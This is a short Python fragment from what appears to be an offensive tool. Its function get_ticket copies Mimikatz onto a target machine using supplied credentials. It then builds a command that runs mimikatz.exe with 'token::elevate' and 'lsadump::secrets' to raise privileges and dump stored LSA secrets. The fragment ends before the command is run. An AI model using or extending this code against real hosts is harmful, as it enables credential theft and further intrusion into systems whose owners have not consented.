from colored import Fore
import re
from .miscellaneous import execute_cmd, drop_mimikatz

def get_ticket(target: str, username: str, password: str, bool=False) -> None:
    drop_mimikatz(username, password, target)

    cmd_command = rf'C:\Users\{username}\Desktop\mimikatz.exe "token::elevate" "lsadump::secrets" "exit"'